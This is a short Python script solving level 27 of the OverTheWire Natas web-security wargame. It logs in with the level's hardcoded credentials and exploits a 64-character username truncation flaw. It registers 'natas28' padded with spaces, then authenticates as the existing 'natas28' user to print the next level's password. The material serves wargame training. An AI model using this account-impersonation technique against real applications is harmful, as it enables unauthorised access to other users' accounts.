# Natas27 python solution
# By Emil 'Dota' Bak, 2019

import requests

# ***********************************************
URL = "http://natas27.natas.labs.overthewire.org/"

auth_name = 'natas27'
auth_pass = '55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ'

s      = requests.Session()
s.auth = (auth_name,auth_pass)
# ***********************************************

# By utilizing the knowledge from the source-code, in which VARCHAR(64) is the
# maximum length of a username, and that a loop iterates over if a given
# name exists, it is possible to create a similar user to the currently-
# existing 'natas28', with a long enough username and a new password.

# As a loop iterates over every 'natas28' user, and checks if the given
# password matches any 'natas28' users password, it is possible to get
# access and receive the password for the next level.
username = "natas28" + (' '*64) + "lol"
DATA     = dict(username=username,password="easy")
r = s.post(URL, data=DATA)

DATA_2 = dict(username="natas28",password="easy")

r = s.post(URL, data=DATA_2)
for x in r.iter_lines():
    if "password" in x:
        print x
